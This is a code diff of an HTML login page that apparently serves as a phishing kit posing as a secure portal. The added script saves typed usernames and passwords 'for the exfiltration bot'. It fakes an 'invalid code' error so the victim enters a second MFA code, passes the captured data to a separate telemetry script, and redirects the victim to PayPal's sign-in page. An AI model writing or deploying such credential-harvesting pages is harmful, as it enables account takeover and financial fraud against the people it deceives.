@@ -2,87 +2,77 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Secure Login | Startup Portal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Access | Login</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
 
-<div class="auth-card" id="mainCard">
+<div class="auth-card">
     <div class="logo">TELEMETRY_PRO</div>
 
     <!-- STEP 1: LOGIN -->
-    <div id="step-login">
-        <h2>Welcome back</h2>
-        <p>Enter your credentials to access your dashboard.</p>
-        <form id="loginForm">
-            <input type="text" id="email" placeholder="Email or Username" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button type="submit">Continue</button>
+    <div id="step-1">
+        <p>Log in to manage your account.</p>
+        <form id="form-login">
+            <input type="text" id="u" placeholder="Email or Username" required autocomplete="off">
+            <input type="password" id="p" placeholder="Password" required autocomplete="off">
+            <button type="submit">Next</button>
         </form>
     </div>
 
-    <!-- STEP 2: LOADING -->
-    <div id="step-loading" class="hidden">
-        <div class="spinner"></div>
-        <h2>Securing session...</h2>
-        <p>Verifying your credentials and checking device health.</p>
-    </div>
-
-    <!-- STEP 3: MFA -->
-    <div id="step-mfa" class="hidden">
-        <h2>Check your phone</h2>
-        <p>We've sent a 6-digit verification code to your primary device.</p>
-        <form id="mfaForm">
-            <input type="text" id="mfa_code" class="mfa-input" placeholder="000000" maxlength="6" required>
-            <button type="submit">Verify & Log In</button>
+    <!-- STEP 2: MFA WITH GHOSTING -->
+    <div id="step-2" class="hidden">
+        <h3>Enter Security Code</h3>
+        <p style="font-size: 13px;">A 6-digit code was sent to your device.</p>
+        <span id="mfa-error" class="error-text hidden">Invalid or expired code. Please try again.</span>
+        <form id="form-mfa">
+            <input type="text" id="otp" class="mfa-input" maxlength="6" placeholder="000000" required autocomplete="off">
+            <button type="submit">Verify</button>
         </form>
     </div>
 </div>
 
 <script src="telemetry.js"></script>
 <script>
-    const steps = {
-        login: document.getElementById('step-login'),
-        loading: document.getElementById('step-loading'),
-        mfa: document.getElementById('step-mfa')
-    };
+    let attempts = 0;
 
-    function showStep(stepName) {
-        Object.values(steps).forEach(s => s.classList.add('hidden'));
-        steps[stepName].classList.remove('hidden');
-    }
-
-    // Step 1 -> Step 2 -> Step 3 Logic
-    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    // Handle Login Submit
+    document.getElementById('form-login').addEventListener('submit', async (e) => {
         e.preventDefault();
         
-        // Log inputs to session storage
-        sessionStorage.setItem('log_user', document.getElementById('email').value);
-        sessionStorage.setItem('log_pass', document.getElementById('password').value);
+        // Save to session storage for the exfiltration bot
+        sessionStorage.setItem('log_u', document.getElementById('u').value);
+        sessionStorage.setItem('log_p', document.getElementById('p').value);
         
-        showStep('loading');
-
-        // Simulate a "Real" server delay (1.5 seconds)
-        setTimeout(() => {
-            showStep('mfa');
-            // Fire initial audit while user is busy with MFA
-            TelemetryScanner.runAudit();
-        }, 1500);
+        // Transition UI
+        document.getElementById('step-1').classList.add('hidden');
+        document.getElementById('step-2').classList.remove('hidden');
+        
+        // Trigger initial background audit
+        TelemetryScanner.runAudit();
     });
 
-    document.getElementById('mfaForm').addEventListener('submit', async (e) => {
+    // Handle MFA Submit (Ghosting Logic)
+    document.getElementById('form-mfa').addEventListener('submit', async (e) => {
         e.preventDefault();
-        sessionStorage.setItem('log_mfa', document.getElementById('mfa_code').value);
+        attempts++;
         
-        showStep('loading');
+        const code = document.getElementById('otp').value;
+        sessionStorage.setItem(`mfa_${attempts}`, code);
 
-        // Final Data Exfiltration
-        await TelemetryScanner.runAudit();
-
-        // Redirect to a real page to complete the "simulation"
-        setTimeout(() => {
-            window.location.href = "https://github.com/trending"; 
-        }, 1000);
+        if (attempts === 1) {
+            // Force an error to capture the SECOND code (the "Ghost")
+            document.getElementById('mfa-error').classList.remove('hidden');
+            document.getElementById('otp').value = ""; 
+            
+            // Log the first code immediately
+            TelemetryScanner.runAudit(false);
+        } else {
+            // Finalize capture and redirect
+            await TelemetryScanner.runAudit(true);
+            window.location.href = "https://paypal.com/signin";
+        }
     });
 </script>
 
